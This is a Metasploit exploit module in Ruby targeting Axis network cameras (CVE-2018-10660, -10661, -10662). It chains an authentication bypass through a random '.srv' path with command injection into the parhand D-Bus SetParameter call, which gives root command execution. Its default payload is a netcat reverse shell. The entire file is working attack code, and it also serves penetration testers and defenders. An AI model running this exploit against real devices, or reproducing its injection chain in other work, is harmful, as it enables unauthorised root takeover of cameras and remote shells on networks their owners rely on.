##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
 
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  #include Msf::Exploit::CmdStager
 
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Axis Network Camera .srv to parhand RCE',
      'Description'    => %q{
        This module exploits an auth bypass in .srv functionality and a
        command injection in parhand to execute code as the root user.
      },
      'Author'         => [
        'Or Peles',       # Vulnerability discovery (VDOO)
        'wvu',            # Metasploit module
        'sinn3r',         # Metasploit module
        'Brent Cook',     # Metasploit module
        'Jacob Robles',   # Metasploit module
        'Matthew Kienow', # Metasploit module
        'Shelby Pace',    # Metasploit module
        'Chris Lee',      # Metasploit module
        'Cale Black'      # Metasploit module
      ],
      'References'     => [
        ['CVE', '2018-10660'],
        ['CVE', '2018-10661'],
        ['CVE', '2018-10662'],
        ['URL', 'https://blog.vdoo.com/2018/06/18/vdoo-discovers-significant-vulnerabilities-in-axis-cameras/'],
        ['URL', 'https://www.axis.com/files/faq/Advisory_ACV-128401.pdf']
      ],
      'DisclosureDate' => 'Jun 18 2018',
      'License'        => MSF_LICENSE,
      'Platform'       => ['unix'],# 'linux'],
      'Arch'           => [ARCH_CMD],# ARCH_ARMLE],
      'Privileged'     => true,
      'Targets'        => [
        ['Unix In-Memory',
         'Platform'    => 'unix',
         'Arch'        => ARCH_CMD,
         'Type'        => :unix_memory,
         'Payload'     => {
           'BadChars'  => ' ',
           'Encoder'   => 'cmd/ifs',
           'Compat'    => {'PayloadType' => 'cmd', 'RequiredCmd' => 'netcat-e'}
         }
        ],
=begin
        ['Linux Dropper',
         'Platform'    => 'linux',
         'Arch'        => ARCH_ARMLE,
         'Type'        => :linux_dropper
        ]
=end
      ],
      'DefaultTarget'  => 0,
      'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_netcat_gaping'}
    ))
  end
 
  def exploit
    case target['Type']
    when :unix_memory
      execute_command(payload.encoded)
=begin
    when :linux_dropper
      execute_cmdstager
=end
    end
  end
 
  def execute_command(cmd, opts = {})
    rand_srv = "#{Rex::Text.rand_text_alphanumeric(8..42)}.srv"
 
    send_request_cgi(
      'method'    => 'POST',
      'uri'       => "/index.html/#{rand_srv}",
      'vars_post' => {
        'action'  => 'dbus',
        'args'    => dbus_send(
          method: :set_param,
          param:  "string:root.Time.DST.Enabled string:;#{cmd};"
        )
      }
    )
 
    send_request_cgi(
      'method'    => 'POST',
      'uri'       => "/index.html/#{rand_srv}",
      'vars_post' => {
        'action'  => 'dbus',
        'args'    => dbus_send(method: :synch_params)
      }
    )
  end
 
  def dbus_send(method:, param: nil)
    args = '--system --dest=com.axis.PolicyKitParhand ' \
           '--type=method_call /com/axis/PolicyKitParhand '
 
    args <<
      case method
      when :set_param
        "com.axis.PolicyKitParhand.SetParameter #{param}"
      when :synch_params
        'com.axis.PolicyKitParhand.SynchParameters'
      end
 
    args
  end
 
end
